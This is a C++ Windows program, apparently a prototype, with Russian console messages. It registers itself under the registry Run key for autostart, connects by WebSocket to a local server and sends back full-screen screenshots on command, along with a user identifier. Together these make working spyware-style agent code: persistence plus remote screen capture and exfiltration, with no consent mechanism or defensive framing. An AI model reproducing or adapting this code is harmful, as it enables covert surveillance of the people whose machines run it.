#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <ws2tcpip.h>
#include <iostream>
#include <sstream>
#include <thread>
#include <vector>
#include <Lmcons.h>
#include <ctime>
#include <iomanip>
#include <string>
#include <shlobj.h> 
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "gdiplus.lib")
#pragma comment (lib, "ws2_32.lib")

using namespace Gdiplus;
using namespace std;

ULONG_PTR gdipplusToken;

string base64_encode(const vector<BYTE>& buf) {
    static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string out;
    int val = 0, valb = -6;
    for (BYTE c : buf) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3f]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

bool addToStartup(const std::wstring& appName, const std::wstring& exePath) {
    HKEY hKey = nullptr;
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Не удалось открыть ключ автозагрузки\n";
        return false;
    }

    result = RegSetValueExW(
        hKey,
        appName.c_str(),
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(exePath.c_str()),
        static_cast<DWORD>((exePath.size() + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        std::wcout << L"Программа добавлена в автозагрузку\n";
        return true;
    }
    else {
        std::wcerr << L"Ошибка при записи в реестр\n";
        return false;
    }
}


bool capture_screen(vector<BYTE>& out_png_data) {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    Bitmap bitmap(hBitmap, NULL);
    IStream* istream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &istream);
    CLSID clsidPng;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsidPng);
    bitmap.Save(istream, &clsidPng, NULL);

    STATSTG stats;
    istream->Stat(&stats, STATFLAG_NONAME);
    ULONG size = (ULONG)stats.cbSize.QuadPart;
    out_png_data.resize(size);
    ULONG read;
    LARGE_INTEGER pos = { 0 };
    istream->Seek(pos, STREAM_SEEK_SET, NULL);
    istream->Read(out_png_data.data(), size, &read);

    DeleteObject(hBitmap);
    DeleteDC(hDC);
    istream->Release();
    return true;
}

string toUtf8(const wchar_t* wstr) {
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
    if (size == 0) return "";
    vector<char> buffer(size);
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buffer.data(), size, nullptr, nullptr);

    return string(buffer.data());
}


string getUserID() {
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameW(username, &username_len);

    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computer_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computerName, &computer_len);

    return toUtf8(username) + "@" + toUtf8(computerName);
}

void send_websocket_frame(SOCKET sock, const string& message) {
    vector<char> frame;
    frame.push_back(0x81);

    size_t len = message.size();
    if (len <= 125) {
        frame.push_back((char)(0x80 | len));
    }
    else if (len <= 65535) {
        frame.push_back((char)(0x80 | 126));
        frame.push_back((len >> 8) & 0xFF);
        frame.push_back(len & 0xFF);
    }
    else {
        frame.push_back((char)(0x80 | 127));
        for (int i = 7; i >= 0; --i)
            frame.push_back((len >> (i * 8)) & 0xFF);
    }

    char mask[4];
    srand((unsigned)time(NULL));
    for (int i = 0; i < 4; ++i) mask[i] = rand() % 256;
    frame.insert(frame.end(), mask, mask + 4);

    for (size_t i = 0; i < len; ++i) {
        frame.push_back(message[i] ^ mask[i % 4]);
    }

    send(sock, frame.data(), frame.size(), 0);
}

bool perform_websocket_handshake(SOCKET sock) {
    string key = "dGhlIHNhbXBsZSBub25jZQ==";
    stringstream req;
    req << "GET / HTTP/1.1\r\n";
    req << "Host: localhost:8080\r\n";
    req << "Upgrade: websocket\r\n";
    req << "Connection: Upgrade\r\n";
    req << "Sec-WebSocket-Key: " << key << "\r\n";
    req << "Sec-WebSocket-Version: 13\r\n";
    req << "\r\n";

    string request = req.str();
    send(sock, request.c_str(), request.size(), 0);

    char buffer[2048];
    int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0) return false;
    buffer[received] = 0;
    string response(buffer);
    return response.find("101 Switching Protocols") != string::npos;
}

string receive_websocket_message(SOCKET sock) {
    char hdr[2];
    if (recv(sock, hdr, 2, 0) != 2) return "";
    int payload_len = hdr[1] & 0x7F;

    if (payload_len == 126) {
        char ext[2];
        recv(sock, ext, 2, 0);
        payload_len = ((unsigned char)ext[0] << 8) | (unsigned char)ext[1];
    }
    else if (payload_len == 127) {
        char ext[8];
        recv(sock, ext, 8, 0);
        payload_len = 0; 
    }

    string payload(payload_len, 0);
    recv(sock, &payload[0], payload_len, 0);
    return payload;
}


int main() {
    setlocale(LC_ALL, "RU");
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    addToStartup(L"MyAgentApp", exePath);
    GdiplusStartupInput gdiStartupInput;
    GdiplusStartup(&gdipplusToken, &gdiStartupInput, NULL);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server{};
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
        cout << "Ошибка подключения\n";
        return 1;
    }

    if (!perform_websocket_handshake(sock)) {
        cout << "Handshake не удался\n";
        return 1;
    }

    cout << "WebSocket соединение установлено\n";
    string userID = "Testuser42"; //"getUserID();"
    string hello = R"({"type":"hello","message":"I am connected","user":")" + userID + R"("})";
    send_websocket_frame(sock, hello);

    while (true) {
        string msg = receive_websocket_message(sock);
        if (msg.empty()) break;

        cout << "Получено: " << msg << endl;

        if (msg.find("request_screenshot") != string::npos) {
            vector<BYTE> imageData;
            if (capture_screen(imageData)) {
                string encoded = base64_encode(imageData);
                string reply = R"({"type":"screenshot","image":")" + encoded + R"("})";
                send_websocket_frame(sock, reply);
                cout << "Скриншот отправлен\n";
            }
        }
    }

    closesocket(sock);
    WSACleanup();
    GdiplusShutdown(gdipplusToken);
    return 0;
}